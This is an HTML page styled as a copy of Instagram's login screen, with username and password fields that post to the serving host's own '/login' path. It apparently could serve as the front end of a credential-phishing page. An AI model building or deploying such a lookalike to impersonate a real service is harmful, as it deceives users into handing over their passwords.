<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            max-width: 350px;
            width: 100%;
            text-align: center;
        }
        h1 {
            font-family: 'Billabong', sans-serif;
            font-size: 48px;
            margin-bottom: 30px;
            color: #262626;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            margin: 4px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        button {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 12px;
            cursor: pointer;
            opacity: 0.7;
        }
        button:hover { opacity: 1; }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .or-divider::before, .or-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .or-divider::before { margin-right: 18px; }
        .or-divider::after { margin-left: 18px; }
        .forgot { color: #00376b; font-size: 12px; margin-top: 12px; display: block; text-decoration: none; }
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Instagram</h1>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="or-divider">OR</div>
        <a class="forgot" href="#">Forgot password?</a>
    </div>
    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</body>
</html>
